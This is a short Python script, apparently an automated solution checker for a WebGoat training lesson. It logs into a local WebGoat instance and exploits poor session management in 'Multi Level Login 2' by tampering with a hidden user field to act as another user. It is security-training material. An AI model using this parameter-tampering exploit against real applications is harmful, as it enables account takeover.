import requests
import re
import sys

wb_auth_url = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'
wb_creds = {'username':'webgoat', 'password':'webgoat'}

vuln_url = 'http://127.0.0.1:8080/WebGoat/attack?Screen=1111&menu=500'
vuln_data = {'user2': 'Joe', 'pass2':'banana', 'Submit':'Submit'}

headers = {'Context-Type': 'application/x-www-form-urlencoded;', 'Connection':'keep-alive'}

# authenticate with webgoat
r = requests.post(wb_auth_url, data=wb_creds)

# grab session cookie
cookies = {'JSESSIONID': r.cookies['JSESSIONID']}

# find lession id - it changes every session
r = requests.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc', cookies=cookies)

m = re.search("Multi Level Login 2', u'showHints': True, u'link': u'attack\?Screen=(\d+)", str(r.json))
attack_id =  m.group(1)

vuln_url = 'http://127.0.0.1:8080/WebGoat/attack?Screen={}&menu=500'.format(attack_id)
vuln_data = {'user2': 'Joe', 'pass2':'banana', 'Submit':'Submit'}

# authenticate with valid credentials at vulnerable url
v = requests.post(vuln_url, headers=headers, data=vuln_data, cookies=cookies)

# exploit poor session management
data = {'hidden_user': 'Jane', 'tan2': 15161, 'Submit': 'Submit'}

x = requests.post(vuln_url, data=data, cookies=cookies)

m = re.search("Jane", x.text)

if m is not None:
  exit(0)

exit(1)
